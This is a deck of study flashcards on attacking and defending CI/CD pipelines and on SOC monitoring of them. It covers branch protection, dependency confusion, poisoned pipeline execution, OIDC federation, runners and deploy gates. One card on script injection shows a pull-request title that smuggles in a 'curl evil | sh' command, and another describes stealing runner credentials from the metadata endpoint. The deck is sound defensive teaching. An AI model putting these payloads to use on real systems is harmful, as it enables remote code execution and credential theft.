description: How CI/CD pipelines get attacked and defended (source, build, identity, runners, artifacts, deploy gates) and how a Security Operations Center (SOC) monitors them: telemetry sources, detection use-cases per stage, triage and response, maturity. For a cloud/Kubernetes platform architect working with a SOC.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: Why is a CI/CD pipeline a higher-value target than any single production server?
notes.back: It holds write access to source, secrets for every environment and a trusted path to production. One compromise fans out to every deployment.
notes.analogy: Robbing one branch gets one vault; compromising the armoured-car company gets every branch's deposits, delivered on schedule.
notes.extra: In practice: attackers call it the "keys to the kingdom": the pipeline is the one system that legitimately touches everything.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: What made the SolarWinds (SUNBURST) attack a lesson about build security rather than code security?
notes.back: The source repository was clean. Malware was injected into the build process itself, so signed, official releases carried the backdoor.
notes.extra: Lesson: reviewing source is not enough; the build environment and its provenance must be trustworthy and verifiable.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: What did the Codecov bash-uploader incident (2021) teach about third-party scripts in pipelines?
notes.back: A modified upload script silently exfiltrated environment variables (CI secrets) from thousands of pipelines for months.
notes.extra: Lesson: pin third-party tooling by hash, give jobs minimal secrets, and monitor runner egress for unexpected destinations.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: What did the xz-utils backdoor (2024) show about the human side of the supply chain?
notes.back: A patient attacker earned maintainer trust over years, then hid a backdoor in build scripts and test files, not in the readable source.
notes.extra: Lesson: trust in maintainers is an attack surface; builds should be reproducible from reviewed source, not from opaque tarballs.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: Pipeline attack surface: what are the four stages an attacker can target?
notes.back: Source (code, dependencies), build (runners, scripts), distribution (artifacts, registries) and deploy (credentials, cluster access).
notes.extra: Use: this stage model is the backbone of both the controls and the Security Operations Center (SOC) detection use-cases in this deck.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.text: Supply-chain threats by stage (SLSA model): tampering with source = {{c1::compromised source control or malicious commit}}; tampering during build = {{c2::compromised build platform or modified build process}}; after build = {{c3::compromised package registry or substituted artifact}}.
notes.extra: Note: Supply-chain Levels for Software Artifacts (SLSA) names these threats A–H; the three groups above are what matters for defence planning.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: What is the OWASP Top 10 CI/CD Security Risks list, and what is its first entry?
notes.back: A catalogue of pipeline-specific risks. Number one is insufficient flow control mechanisms: an attacker with one credential can push code to production alone.
notes.extra: Others: inadequate identity management, dependency chain abuse, poisoned pipeline execution, insufficient pipeline-based access controls, insecure configuration, ungoverned third-party services.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: What is Poisoned Pipeline Execution (PPE)?
notes.back: Getting the pipeline to run attacker-controlled commands by modifying the pipeline definition or files it executes, without needing access to the build system itself.
notes.analogy: You don't break into the factory; you slip a new page into the recipe book the factory follows.
notes.extra: Variants: direct (edit the workflow file), indirect (edit a Makefile or script the workflow calls), public (via a pull request from a fork).

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: Why does a developer laptop compromise often end as a pipeline compromise?
notes.back: Laptops hold Git credentials, personal access tokens and cloud profiles. Pushing one commit or stealing one token turns endpoint access into pipeline access.
notes.extra: Control: short-lived tokens, signed commits with hardware keys, and a required review before anything the pipeline executes changes.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: Confidentiality vs integrity: which matters more for a pipeline, and why?
notes.back: Integrity. A leaked build log is bad; a modified artifact shipped to every customer is catastrophic. Pipeline security is mostly about proving nothing was altered.
notes.analogy: A pharmacy worries less about someone reading the prescription than about someone swapping the pills.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: What does "shift left" security miss that pipeline security must add?
notes.back: Shift-left scans the code developers write. Pipeline security protects the machinery that turns that code into a running system: runners, secrets, artifacts and deploy paths.

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: Why should the pipeline be treated as production rather than as a developer tool?
notes.back: It has production access and runs unreviewed third-party code. Anything with production privileges needs production-grade hardening, logging and on-call.
notes.extra: Consequence: runner images, pipeline configuration and secrets belong in the change-management and monitoring scope of the Security Operations Center (SOC).

notes.deck: Pipeline Security & SOC Monitoring::01 Why Pipelines Are Targets
notes.front: What is the blast radius question to ask of every pipeline credential?
notes.back: "If this one secret leaks, what can the attacker reach?" The answer sizes both the hardening priority and the incident playbook.
notes.extra: Example: a cluster-admin kubeconfig in a shared CI variable has a blast radius of every namespace; an OpenID Connect (OIDC)-issued, job-scoped token has one deployment.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What does branch protection on the main branch actually prevent?
notes.back: Direct pushes, force-pushes and merges without review or passing checks. It makes the review gate mandatory instead of a habit.
notes.analogy: A turnstile instead of a sign saying "please check in": nobody passes without the badge.
notes.extra: Pitfall: administrators are often exempt by default; include them, and alert when protection is changed.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: Why is "require review" alone a weak control against an insider or a stolen account?
notes.back: A reviewer can be the attacker's own second account, or approvals can be given before a last-minute push. Require fresh approval after every push and CODEOWNERS from a different team.
notes.analogy: Two signatures on a cheque mean nothing if the same person holds both pens.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What does a signed commit prove, and what does it not prove?
notes.back: It proves the commit was created by the holder of a key. It does not prove the content is safe or that the key owner was not compromised.
notes.extra: Pair with: a require signed commits branch rule, so unsigned history cannot land on main.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: Commit author vs commit signer: why can the two differ, and why does that matter?
notes.back: The author field is free text set by the client; anyone can write author = ceo@company. Only the signature ties the commit to a verified key.
notes.extra: Detection use: an "author" that does not match the pushing account is a common spoofing signal.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What is dependency confusion (substitution attack)?
notes.back: Publishing a public package with the same name as an internal private one, with a higher version, so a resolver fetches the attacker's package instead.
notes.analogy: Someone registers your company's name as a public business and your mail starts going to them.
notes.extra: Defence: scoped namespaces, a private registry that never falls back to public, and lockfiles pinned by hash.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What is typosquatting in package registries?
notes.back: Publishing a malicious package under a near-miss name (requets, lodash-utils) hoping a developer or script mistypes or trusts the name.
notes.extra: Defence: allow-lists or curated internal mirrors, and install-time hooks that flag first-time packages.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: Why do lockfiles matter for security, not just reproducibility?
notes.back: They pin exact versions and integrity hashes, so a newly published malicious version is not pulled in silently by a loose range like ^1.2.
notes.analogy: A pinned recipe lists the exact brand and batch; "any flour" lets the shop substitute whatever is on the shelf.
notes.extra: Pitfall: a pull request that changes the lockfile deserves a close look; attackers hide version swaps there.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What is the risk of install-time scripts (npm postinstall, setup.py) and the mitigation?
notes.back: They run arbitrary code with the installer's privileges before any review. Mitigate with --ignore-scripts in CI and vetting of packages that need scripts.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What is a secret-scanning pre-receive (push protection) hook and why is it better than scanning after commit?
notes.back: It rejects a push that contains a credential pattern before it lands. Once a secret is in history, it must be treated as leaked and rotated, even if the commit is removed.
notes.analogy: A metal detector at the door beats searching the building afterwards.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: A secret was committed and the commit was force-pushed away. Is the secret safe?
notes.back: No. Forks, clones, CI caches, pull-request refs and the provider's own storage keep it. Rotate it and treat it as compromised.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What is Software Composition Analysis (SCA), and what is its blind spot?
notes.back: Scanning dependencies for known Common Vulnerabilities and Exposures (CVEs). Blind spot: it finds known bad versions, not deliberately malicious packages with no CVE yet.
notes.extra: Complement: behavioural checks on new packages (network calls at install time, obfuscated code, maintainer changes).

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: Why should vendored or mirrored dependencies be preferred for critical builds?
notes.back: The build no longer depends on a public registry being honest and available at build time; the mirror is a reviewed, immutable snapshot.
notes.extra: Cost: someone must own updating the mirror; stale mirrors become a vulnerability source of their own.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What is the security reason for pull requests from forks being treated differently from branch pull requests?
notes.back: A fork pull request is untrusted code from anyone. If the pipeline runs it with repository secrets, any stranger can exfiltrate those secrets.
notes.analogy: A stranger's parcel is opened in the mailroom, not on the CEO's desk.
notes.extra: Control: run fork pull requests without secrets, or require a maintainer to approve the run first.

notes.deck: Pipeline Security & SOC Monitoring::02 Source & Dependencies
notes.front: What should trigger an alert in a repository's settings history?
notes.back: Branch protection weakened or removed, a new deploy key or webhook, visibility changed to public, or a new collaborator with write access.
notes.extra: Why: these are the quiet steps an attacker takes before pushing malicious code, so they are the earliest detection point.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: What is script injection in a workflow definition?
notes.back: Interpolating untrusted input (branch name, pull-request title, issue body) directly into a shell step, so an attacker's text runs as commands.
notes.analogy: Writing "and give him the keys" on the visitor form because the guard reads it aloud as instructions.
notes.extra:
Example: run: echo "${{ github.event.pull_request.title }}" with a title of "; curl evil | sh; #.
Fix: pass the value through an environment variable and quote it.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: What is a "pwn request"?
notes.back: A fork pull request that exploits a workflow configured to run on pull_request_target (with secrets and write access) while checking out the attacker's code.
notes.extra: Rule: never check out and execute pull-request head code in a privileged workflow trigger.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: Why is pinning a third-party action or plugin to a tag (@v3) insufficient?
notes.back: Tags are mutable; the publisher, or anyone who compromises them, can move the tag to malicious code. Pin to a full commit SHA and update deliberately.
notes.extra: Lesson: the 2025 tj-actions/changed-files compromise retagged every version to a secret-dumping payload.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: What is cache poisoning in a CI system?
notes.back: Writing malicious content into a shared build cache (dependency or Docker layer cache) from a low-privilege run, so a later privileged run restores and executes it.
notes.analogy: Someone swaps the ingredients in the shared pantry; the next cook uses them without looking.
notes.extra: Control: scope caches to branch and trust level; never share caches between fork runs and main-branch runs.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: Why can build logs be a secret-leak channel, and what does masking not fix?
notes.back: Scripts echo environment variables or tokens; logs are often readable widely. Masking hides exact matches only; encoded or split values pass through.
notes.extra: Control: restrict log read access, and detect long high-entropy strings in logs.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: Hermetic build: what does it block that matters for pipeline security?
notes.back: Network access during the build. Without it, a build step cannot fetch an unpinned dependency, phone home or exfiltrate secrets.
notes.extra: See also: Platform Engineering deck for the full definition and Supply-chain Levels for Software Artifacts (SLSA) context.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: Why does a reproducible build matter for detecting a compromised build server?
notes.back: Two independent builders from the same source should produce byte-identical output. A difference reveals tampering that signatures from the compromised builder would hide.
notes.analogy: Two accountants doing the books independently; a mismatch exposes the one cooking them.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: What does build provenance let a Security Operations Center (SOC) answer during an incident?
notes.back: "Which source commit, builder and workflow produced this exact artifact?" It links a deployed digest back to code, so scope and blame are traceable.
notes.extra: Format: a signed in-toto attestation (SLSA provenance); see Platform Engineering deck.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: Why should the workflow definition itself be reviewed more strictly than application code?
notes.back: It is executable configuration with access to secrets and deploy rights. A one-line change can alter what runs, where, and with which credentials.
notes.extra: Control: CODEOWNERS on .github/workflows/, .gitlab-ci.yml, Jenkinsfile; alert on any change by a non-platform user.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: What is indirect Poisoned Pipeline Execution, and why is it harder to catch?
notes.back: The workflow file is untouched; the attacker edits something it calls: a Makefile, test script, Dockerfile or linter configuration. Reviews focused on workflow files miss it.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: Why is "run tests from the pull request" a privilege-escalation path?
notes.back: Test code is arbitrary code. If it runs on a runner that also holds deploy credentials or network access to production, the pull request author controls that runner.
notes.analogy: Letting the job applicant run their own demo on the payroll computer.
notes.extra: Control: separate untrusted (test) jobs from trusted (sign, deploy) jobs on different runners with different secrets.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: Trusted vs untrusted pipeline stages: what is the dividing rule?
notes.back: Anything that executes contributor-controlled code is untrusted and must hold no secrets; signing and deploying are trusted and must only consume artifacts, never run contributor code.
notes.analogy: Kitchen and cash register are separate rooms; the cook never touches the till.

notes.deck: Pipeline Security & SOC Monitoring::03 Build & Workflow Attacks
notes.front: What is a self-approving pipeline smell?
notes.back: The pipeline can modify its own definition or the rules that gate it (for example, a bot token that can edit branch protection). An attacker who controls one run then controls future runs.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: Why are long-lived static credentials stored as CI variables the single biggest pipeline risk?
notes.back: They are readable by every job that can reference them, survive in logs and caches, and remain valid after a leak until someone notices and rotates them.
notes.analogy: A spare house key under the doormat: handy, and it stays there until someone else finds it.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: How does OpenID Connect (OIDC) workload federation remove static cloud keys from a pipeline?
notes.back: The CI provider issues the job a short-lived signed token with claims (repository, branch, workflow). The cloud trusts that issuer and exchanges it for temporary credentials.
notes.analogy: Instead of lending employees a master key, the building issues a badge that only works for their shift and their floor.
notes.extra: Result: no secret is stored anywhere; credentials expire in minutes and are bound to a specific job identity.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.text: In OpenID Connect (OIDC) pipeline federation, the cloud trust policy should restrict on the token's {{c1::subject (sub)}} claim, which encodes repository, {{c2::branch or environment}}, and sometimes workflow, so a token from a feature branch cannot assume the production role.
notes.extra: Pitfall: a policy that matches only the issuer (iss) lets every repository on that CI provider assume the role.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: What does a job-scoped token (for example GitHub's GITHUB_TOKEN) protect against, and what is the default-permission pitfall?
notes.back: It expires when the job ends, limiting replay. Pitfall: the default grant is often broad (write to contents, packages); set permissions: to read-only and widen per job.
notes.analogy: A day pass that expires at the gate on the way out.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: Personal Access Token (PAT) vs OpenID Connect (OIDC) federation for deploy credentials: key difference?
notes.back: A PAT is a long-lived bearer secret tied to a person; OIDC is an ephemeral token tied to a job identity. A leaked PAT works until revoked; an OIDC token dies in minutes.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: Why should pipeline secrets be scoped to environments rather than to the repository?
notes.back: A repository-wide secret is available to every workflow, including untrusted ones. An environment secret (production) is released only to jobs targeting that environment, often after approval.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: What is the role of a secrets manager (Vault, cloud secrets store) in a pipeline compared with CI variables?
notes.back: Secrets are fetched at run time by the job's identity, with audit logs per access, versioning and automatic rotation, instead of copied into CI configuration.
notes.extra: Monitoring win: every secret read becomes an audit event the Security Operations Center (SOC) can baseline.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: What are dynamic secrets, and why do they suit pipelines?
notes.back: Credentials created on demand (a database user, a cloud role session) with a short time to live (TTL) and revoked afterwards. A leaked one is already dead by the time it is found.
notes.analogy: A single-use lock combination texted to the courier, useless once the delivery is done.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: Why should a bot or service account used by the pipeline never be a human's account?
notes.back: Human accounts carry broad rights, multi-factor prompts and survive job changes. A dedicated identity has minimal permissions, clear ownership and an unambiguous audit trail.
notes.extra: Detection: a human account acting from a runner IP range is itself a strong alert.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: What is least privilege for a deploy job in Kubernetes terms?
notes.back: A namespaced ServiceAccount or federated identity with Role rights only on the objects it deploys (Deployments, ConfigMaps), never cluster-admin and never Secrets it does not write.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: What is secret sprawl in CI, and how do you measure it?
notes.back: The same credential copied into many repositories, variables and tools. Measure by inventorying where each secret's hash appears; each copy is a separate leak and rotation point.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: Why does rotation not replace short-lived credentials?
notes.back: Rotation every 90 days leaves a leaked key valid for up to 90 days. Short-lived credentials shrink that window to minutes without anyone remembering to rotate.
notes.analogy: Changing the locks every quarter still leaves a stolen key working for three months.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: What is a deploy key, and why does an unexpected new one deserve an alert?
notes.back: An SSH key granting a single repository access, usually for automation. A new one appearing outside change control is a classic persistence step after account compromise.

notes.deck: Pipeline Security & SOC Monitoring::04 Identity & Secrets in Pipelines
notes.front: How does SPIFFE/SPIRE-style workload identity relate to pipeline identity?
notes.back: Both give a workload a verifiable, short-lived identity instead of a stored secret. Pipeline OpenID Connect (OIDC) tokens are the CI provider's version of a workload identity document.
notes.extra: See also: Identity & Zero Trust deck for SPIFFE itself.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: Why are ephemeral runners (one job, then destroyed) a security control, not just a cost choice?
notes.back: Nothing persists between jobs: no leftover credentials, no planted binaries, no poisoned caches. An attacker who compromises a job loses it minutes later.
notes.analogy: A hotel room cleaned and re-keyed after every guest; the last guest cannot leave a bug for the next.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: What is the core danger of a persistent self-hosted runner?
notes.back: A compromised job can install persistence (cron, modified tools, stolen cached tokens) that silently affects every later job, including trusted deploy jobs.
notes.analogy: A shared workbench: a saboteur loosens one bolt and every later product is affected.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: Why must a self-hosted runner never be registered on a public repository?
notes.back: Anyone can open a pull request, and the runner executes it. A public repository plus a self-hosted runner equals remote code execution on your network for strangers.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: What is runner network segmentation, and what is the minimum?
notes.back: Runners live in their own network zone with egress limited to the registries, package mirrors and APIs they need. No route to production databases or the corporate LAN.
notes.analogy: The workshop has one door to the loading dock and none to the office.
notes.extra: Detection: any runner connection outside the allow-list is a high-fidelity alert because the legitimate destinations are few and known.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: Why is egress monitoring on runners more valuable than on ordinary servers?
notes.back: Builds have a small, predictable set of destinations. Exfiltration of secrets or a downloaded second-stage payload stands out as a new, unknown destination.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: What is the risk of running CI jobs on a shared Kubernetes cluster with other workloads?
notes.back: Build jobs run arbitrary code; a container escape or an over-permissive ServiceAccount reaches neighbouring workloads and the cluster API.
notes.extra: Control: dedicated node pools, restricted Pod Security level, no default ServiceAccount token mounted, NetworkPolicy default-deny.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: Why is Docker-in-Docker with a mounted Docker socket on a runner equivalent to root on the host?
notes.back: Whoever controls the socket can start a privileged container with the host filesystem mounted. Any job can therefore take the runner host and everything on it.
notes.analogy: Handing a visitor the master key cabinet because they asked for one door.
notes.extra: Alternatives: rootless builders such as BuildKit rootless, kaniko or buildah, or a remote build service.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: What does runner image hardening involve, and why keep the image minimal?
notes.back: Pinned base image, only required toolchains, no interactive shells for untrusted jobs, regular rebuilds. Fewer tools mean fewer living-off-the-land options for an attacker.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: What is the runner-token risk for self-hosted agents?
notes.back: The registration or agent token lets anyone attach a rogue runner that receives jobs, secrets and code. Treat it as a privileged secret and alert on new runner registrations.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: What is the difference in trust between the CI provider's hosted runner and your own self-hosted runner?
notes.back: Hosted: you trust the vendor's isolation, but it is ephemeral and patched for you. Self-hosted: you control the network and tooling, but you own isolation, patching and persistence risk.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: Why should the runner's own metadata endpoint (cloud instance metadata) be blocked from jobs?
notes.back: The instance role credentials are available to any process on the runner. A job can curl the metadata service and inherit the runner's cloud permissions.
notes.analogy: The company credit card is taped under the desk every temp worker sits at.
notes.extra: Control: instance metadata service v2 (IMDSv2) with hop limit 1, or an egress rule blocking 169.254.169.254 from job containers.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: What is the security role of build isolation per tenant in a shared platform?
notes.back: Teams' jobs must not share runners, caches or credentials. Otherwise one team's compromised dependency can read another team's secrets.

notes.deck: Pipeline Security & SOC Monitoring::05 Runners & Build Infrastructure
notes.front: How should runtime security tooling (Falco, Tetragon, endpoint detection and response (EDR)) treat a runner differently from an app server?
notes.back: Compilation, package installs and outbound fetches are normal on runners, so rules must baseline that, and instead flag credential-file reads, metadata access and unusual egress.
notes.extra: See also: Linux Internals for K8s Security deck for how these tools hook the kernel.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: Why deploy by image digest rather than by tag?
notes.back: A tag (:1.4, :latest) can be repointed to a different image; a digest is a content hash that identifies exactly one image forever.
notes.analogy: A fingerprint, not a name tag: a name tag can be swapped between people.
notes.extra: Rule: the pipeline resolves tag → digest once at build time and writes the digest into the deployment manifest.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What is tag immutability in a registry, and what attack does it stop?
notes.back: A registry setting that refuses to overwrite an existing tag. It stops an attacker with push rights from silently replacing a released image under its trusted name.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: Why should write access to the production registry be limited to the trusted build job only?
notes.back: Anything that can push there can ship code to production. Developer accounts and untrusted jobs should only push to staging or scratch repositories.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What does signature verification at admission add that signing alone does not?
notes.back: Enforcement. Signing without verification is a label; an admission policy (Kyverno verifyImages, Sigstore policy-controller) refuses to run anything not signed by the trusted build identity.
notes.extra: See also: Platform Engineering deck for Cosign and policy-as-code details.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What should an admission verification policy check beyond "a valid signature exists"?
notes.back: Who signed: the certificate identity (workflow and repository) and issuer must match the expected build pipeline. Any valid Sigstore signature is not enough.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What is a pull-through cache / proxy registry, and what are its two security benefits?
notes.back: An internal registry that fetches upstream images once and serves them from inside. Benefits: a single scan-and-allow point, and no runner or node reaching public registries directly.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: Why does a GitOps deploy model improve pipeline security compared with CI pushing to the cluster?
notes.back: The CI job needs no cluster credentials at all; it only commits to Git. The cluster agent pulls, so the most sensitive credential never leaves the cluster.
notes.analogy: The warehouse collects orders from the mailbox; nobody outside ever gets a key to the warehouse.
notes.extra: Bonus: the desired state is reviewable, signed and auditable in Git.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What is drift between Git and the cluster, and why is it a security signal?
notes.back: A live object differs from its declared state. Legitimate causes exist, but drift is also what a manual kubectl edit by an attacker looks like.
notes.analogy: The blueprint says one door; the building has two. Either the plans are stale or someone cut a hole.
notes.extra: Response: self-heal plus an alert, so the change is reverted and investigated.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What is an environment protection rule (required reviewers, wait timer, branch restriction)?
notes.back: A gate on the deploy stage: production secrets are released only after a named approver confirms and only from allowed branches. It enforces the four-eyes principle at deploy time.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What is artifact promotion, and why is it safer than rebuilding per environment?
notes.back: The exact tested artifact (by digest) moves from dev to staging to production. Rebuilding could introduce different dependencies, so what was tested is not what runs.
notes.analogy: You ship the inspected crate, not a new crate packed from the same list.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What should a Security Operations Center (SOC) be able to do with a Software Bill of Materials (SBOM) during a zero-day?
notes.back: Query every deployed artifact for the affected component and version in minutes, instead of asking each team to check. The SBOM must be indexed, not just stored.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: Why should vulnerability scanning run on the registry continuously, not only in the pipeline?
notes.back: New Common Vulnerabilities and Exposures (CVEs) are published daily. An image that was clean at build time is vulnerable tomorrow; only re-scanning what is deployed reveals that.

notes.deck: Pipeline Security & SOC Monitoring::06 Artifacts, Registries & Deploy Gates
notes.front: What is a break-glass deployment, and what must always accompany it?
notes.back: A bypass of normal gates for emergencies. It must be rare, require a named person, be logged loudly, and trigger a Security Operations Center (SOC) review afterwards.
notes.extra: Detection: break-glass used without a linked incident ticket is itself an alert.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: What is a Security Operations Center (SOC), in one line?
notes.back: The team and tooling that continuously collects security telemetry, detects suspicious activity, triages it and coordinates response.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: What is a detection use-case?
notes.back: A documented, testable rule: the threat it covers, the log source it needs, the logic, expected false positives and the response playbook when it fires.
notes.analogy: A smoke detector spec: what it must sense, where it hangs, how it is tested, and who runs when it beeps.
notes.extra: Not: a bare query. Without the threat, the source and the playbook it cannot be maintained or measured.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.text: Detection use-case lifecycle: {{c1::identify the threat}} (what are we afraid of?) → {{c2::confirm the telemetry}} exists → write and test the rule → {{c3::tune}} on real data → attach a playbook → measure and retire.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: Why map pipeline detections to MITRE ATT&CK techniques?
notes.back: A shared vocabulary for coverage: it shows which attacker behaviours you can see and which are blind spots, and lets red-team findings map straight to missing rules.
notes.analogy: A map of the burglar's known routes, with your cameras drawn on it: the gaps are obvious.
notes.extra: Example: stolen CI token → Valid Accounts; modified workflow file → Supply Chain Compromise; runner egress → Exfiltration over Web Service.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: Security Information and Event Management (SIEM) vs Security Orchestration, Automation and Response (SOAR) in a pipeline context: who does what?
notes.back: SIEM ingests CI, registry and cloud logs and runs detection rules. SOAR runs the playbook when a rule fires: revoke the token, pause the pipeline, open the ticket.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: What is detection-as-code?
notes.back: Detection rules kept in Git, reviewed, unit-tested against sample logs and deployed by a pipeline. The same discipline as application code, applied to the SOC's logic.
notes.analogy: The smoke detectors are built, tested and versioned like the building's software, not configured by hand on each floor.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: What is Sigma in Security Operations Center (SOC) tooling?
notes.back: A vendor-neutral YAML format for detection rules, converted into each SIEM's query language. It makes rules portable and shareable.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: High-fidelity vs high-volume detections: what is the difference and which should pipeline monitoring start with?
notes.back: High-fidelity rules almost never fire falsely (branch protection disabled); high-volume rules need baselining (unusual egress). Start with the high-fidelity ones to earn trust.
notes.analogy: A glass-break sensor versus a motion sensor in a house with a cat.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: Why is alert fatigue especially likely when first onboarding CI logs?
notes.back: Pipelines legitimately do noisy things: install packages, open many connections, use tokens from changing IPs. Untuned rules fire constantly and the team starts ignoring them.
notes.analogy: A car alarm that goes off at every passing truck: soon nobody looks up.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: What are Mean Time To Detect (MTTD) and Mean Time To Respond (MTTR), and why track both for pipeline incidents?
notes.back: MTTD: time from malicious action to alert. MTTR: time from alert to containment. A fast MTTD with a slow MTTR still leaves a leaked token usable for hours.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: Preventive vs detective controls in a pipeline: give one of each and explain why both are needed.
notes.back: Preventive: admission refuses unsigned images. Detective: alert on an attempted unsigned deploy. Prevention stops the act; detection reveals that someone tried.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
notes.front: What is the SOC's role in change management for pipelines?
notes.back: Approved changes (new runner, new secret, workflow rewrite) are registered so the corresponding alerts can be matched and closed fast; unregistered ones become incidents.

notes.deck: Pipeline Security & SOC Monitoring::07 SOC Basics for Pipelines
